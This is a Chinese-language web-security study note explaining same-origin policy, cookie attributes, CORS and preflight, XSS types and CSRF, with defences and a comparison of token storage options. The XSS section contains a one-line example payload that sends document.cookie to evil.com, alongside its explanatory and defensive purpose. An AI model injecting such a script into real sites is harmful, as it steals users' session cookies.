---
title: "[Security]  CORS、XSS、CSRF"
date: 2026-10-26 18:56 +0800
categories: ["Security", "Web Security"]
tags: []
order: "000002_web-security/000002.000001_cors-xss-csrf.md"
image: {path: "/assets/img/covers/Security.png"}
source: DDAN_Usandbox/0_Personal/Security/2_Web-Security/2.1_CORS-XSS-CSRF.md
render_with_liquid: false
---

## Abstract

三個問題的共同根源是 Cookie 的行為：瀏覽器帶不帶 Cookie 只看目標網域，不管請求是從哪個網頁發出的。
同源政策防止別的網站讀取你在其他網站的資料，CORS 是後端明確放行跨來源的方式；XSS 是把惡意 script 注入合法網站執行，CSRF 是冒用你的 Cookie 發請求。
Token 放 LocalStorage 怕 XSS，放 `HttpOnly` Cookie 要防 CSRF，沒有絕對安全的存法。

---

## 同源政策

登入 `bank.com` 後，瀏覽器存了登入用的 Cookie。
如果沒有限制，`evil.com` 的 JavaScript 可以直接發請求給 `bank.com`，瀏覽器還會自動帶上 `bank.com` 的 Cookie，就能假裝是你去查餘額、轉帳。

同源政策規定協定、網域、Port 三者都相同才算同源，JavaScript 預設讀不到跨來源的回應內容。

---

## Cookie

Server 回應 `Set-Cookie: SESSION_ID=abc123`，瀏覽器存起來，之後對同一個網域的任何請求都自動帶上 `Cookie: SESSION_ID=abc123`。

**帶不帶 Cookie 只看目標網域，不管請求是從哪個網頁發出的。**

| 屬性 | 作用 |
|---|---|
| `HttpOnly` | JavaScript 讀不到，防 XSS 偷 Cookie |
| `Secure` | 只走 HTTPS |
| `SameSite` | 跨站請求時要不要帶上，防 CSRF |

---

## CORS

前後端分離時，前端 `localhost:3000`、後端 `localhost:8080`，Port 不同就是不同來源：

```txt
Access to fetch ... has been blocked by CORS policy
```

**CORS 是瀏覽器的限制，不是 Server 擋下請求。**
請求其實已經送到後端、也處理完了，只是後端沒有明確允許這個來源，瀏覽器就不把回應交給 JavaScript。

解法是後端在 response 加上：

```txt
Access-Control-Allow-Origin: http://localhost:3000
```

### Preflight（OPTIONS）

- 簡單請求（`GET`、表單格式的 `POST`）：直接送出。
- 非簡單請求（帶 `Authorization` 這種自訂 Header、`PUT`、`DELETE`）：瀏覽器先送一個 `OPTIONS` 問 Server「用這個方法、帶這些 Header 可以嗎」，Server 回覆允許的方法、Header、來源後，才送出真正的請求。

---

## XSS（Cross-Site Scripting）

攻擊者讓自己的 JavaScript 在別人的瀏覽器裡、以別人的身份執行。
例如在書店的評論欄位貼上：

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

後端沒過濾就存進資料庫，之後每個看到這則評論的人，瀏覽器都會執行它。
惡意程式是在合法網站裡跑的，同源政策擋不住。

| 類型 | 說明 |
|---|---|
| Stored XSS | 存進資料庫，有人讀到就中招，影響最大 |
| Reflected XSS | 藏在 URL 參數裡，靠釣魚連結誘騙點擊 |
| DOM-based XSS | 前端自己把不受信任的資料塞進 `innerHTML`，問題在前端程式碼 |

防禦：

- 輸出時 escape / encode，讓 `<script>` 變成純文字顯示。
- 不用 `innerHTML`，改用 `textContent` 或框架預設的安全綁定。
- 設定 CSP，限制只能執行指定來源的 script。

---

## CSRF（Cross-Site Request Forgery）

不需要注入程式碼，利用的是瀏覽器自動帶 Cookie。
書店有下單 API `POST https://shop.com/api/orders`，攻擊者誘騙使用者打開惡意網站、自動送出表單到這個 API；瀏覽器帶上 `shop.com` 的 Cookie，Server 驗證有效，就當成本人下單。

- XSS：注入程式碼，在使用者的瀏覽器裡執行，能做的事很多。
- CSRF：冒用身份發請求，只是利用 Cookie 會被自動帶上。

`HttpOnly` 只讓 JavaScript 讀不到 Cookie，**瀏覽器發請求時照樣會帶**，所以用 Cookie 存 Token 還是要防 CSRF：

- CSRF Token：Server 產生隨機 Token，前端發請求時另外帶上；Cookie 會自動帶，這個 Token 不會。
- `SameSite` 設成 `Strict` 或 `Lax`：跨站請求不帶 Cookie。
- 檢查 `Referer` / `Origin`：輔助防線。

---

## Token 存哪裡

| | LocalStorage | `HttpOnly` Cookie |
|---|---|---|
| 好處 | 前端直接讀，方便 | JavaScript 讀不到，比較不怕 XSS 偷 Token |
| 要防 | XSS | CSRF |

沒有絕對安全的存法，重點是知道各自擋住哪個攻擊、還留下哪個破口。
